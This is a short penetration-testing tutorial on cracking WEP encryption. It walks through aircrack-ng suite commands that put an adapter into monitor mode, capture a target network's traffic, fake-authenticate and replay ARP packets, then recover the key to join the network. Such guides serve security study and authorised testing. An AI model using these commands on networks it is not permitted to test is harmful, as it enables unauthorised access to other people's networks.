# Cracking WEP

## Attack tree

```text
1 Verify wireless NIC
2 Discover networks with Airodump-ng
3 Capture traffic with Airodump-ng
4 Associate with access point and replay traffic
5 Crack the WEP key
```

## Example

### Verify wireless NIC

View and document wireless adapter:

```text
# airmon-ng
```

Create an interface that runs in monitor mode:

```text
# airmon-ng start wlan0
```
Write down interface name (something like `wlan0mon`)

### Discover networks with Airodump-ng

Display a list of wireless networks (Ctrl+C to stop):

```text
# airodump-ng wlan0mon
```

* The BSSID is the MAC address of the wireless access point that has been detected.
* PWR is the power level of the access point. The lower the number, the better the signal strength to that access point. 
This is a way to determine how close you are to the access point (unless the administrator changed the power level).
* CH is the channel the access point is operating on, such as 1, 6, or 11.
* ENC is encryption type used, such as WEP, WPA, or WPA2.
* CIPHER is the cipher being used, such as TKIP, CCMP, or WEP.
* ESSID is the name of the wireless network.

At the bottom of the output are the MAC addresses of the access points and the clients (stations) connected to those 
access points.

### Capture traffic with Airodump-ng

In a new terminal window, capture traffic for a specific wireless network:

```text
# airodump-ng -c <channelnumber> -w <filename> --bssid <MAC address of access point> wlan0mon
```

### Associate with access point and replay traffic

To crack the WEP encryption, a large number of packets (approximately 100.000 packets) are needed. 

Associate with the access point first:

```text
# aireplay-ng --fakeauth 0 -a <bssid of the access point> wlan0mon
```

Replay ARP traffic:

```text
# aireplay-ng --arpreplay -b <bssid of the access point> wlan0mon
```

### Crack the WEP key

Specify the .cap file by the filename created earlier, but add a dash and a 01 because it is
the first time.
Just leave it running to keep trying until it cracks the WEP password:

```text
# aircrack-ng <filename.cap>
```

Once the password is cracked, a "KEY FOUND!" appears at the bottom of the
output followed by the encryption key in hex format within square brackets.
Copy this value without the square brackets and remove the
colons (:) before entering the key to connect to the wireless network.

## Tools

* [airmon-ng](https://aircrack-ng.org/doku.php?id=airmon-ng)
* [airodump-ng](https://aircrack-ng.org/doku.php?id=airodump-ng)
* [aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)

## Resources

* [Wired Equivalent Privacy](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)